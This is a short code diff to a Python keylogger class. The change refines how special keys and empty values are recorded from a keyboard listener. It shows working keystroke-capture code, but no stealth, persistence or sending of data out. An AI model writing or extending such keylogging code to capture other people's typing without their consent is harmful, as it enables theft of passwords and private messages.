@@ -28,9 +28,15 @@ class KeyLoggerService(IKeyLogger):
 
     def on_press(self, key):
         try:
-            self.keys.append(key.char)
+            if hasattr(key, 'char'):
+                self.keys.append(key.char)
+            else:
+                key_str = str(key)
+                if key_str.startswith('Key.'):
+                    key_str = key_str[4:]
+                self.keys.append(f" {{{key_str}}} ")
         except AttributeError:
-            self.keys.append(" {" + str(key) + "} " )
+            self.keys.append(f" {{{str(key)}}} ")
 
     def start_logging(self):
         self.listener = keyboard.Listener(on_press=self.on_press)
@@ -42,7 +48,7 @@ class KeyLoggerService(IKeyLogger):
 
     def get_logged_keys(self) -> str:
         # print(self.keys)
-        return "".join(c for c in self.keys)
+        return "".join(c for c in self.keys if c is not None)
 
 
 # w = Writer.FileWriter('myFile.txt')
